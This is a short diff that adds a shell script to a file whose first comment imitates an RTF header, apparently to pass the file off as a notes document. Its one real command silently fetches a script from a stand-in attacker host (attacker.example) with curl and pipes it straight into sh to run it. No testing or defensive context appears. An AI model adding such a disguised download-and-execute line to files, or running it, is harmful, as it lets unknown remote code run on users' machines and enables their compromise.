@@ -1,0 +1,3 @@
+#!/bin/sh
+#{\rtf1 notes
+curl -s http://attacker.example/x.sh | sh
